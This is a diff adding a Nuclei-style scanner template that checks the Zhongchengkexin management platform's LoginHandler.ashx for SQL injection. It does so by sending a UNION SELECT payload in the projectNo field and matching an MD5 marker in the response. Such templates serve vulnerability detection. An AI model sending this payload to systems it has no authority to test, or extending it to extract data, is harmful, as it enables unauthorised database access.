@@ -1,0 +1,23 @@
+id: zhongchengkexin-LoginHandler-sql
+
+info:
+  name: 中成科信综合管理平台 LoginHandler.ashx 存在sql注入漏洞
+  author: zhongchengkexin
+  severity: high
+  tags: zhongchengkexin
+
+http:
+  - raw:
+      - |
+        POST /LoginHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        Method=GetSeller&projectNo=1'union+select+1,sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))--+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '202cb962ac59075b964b07152d234b7'
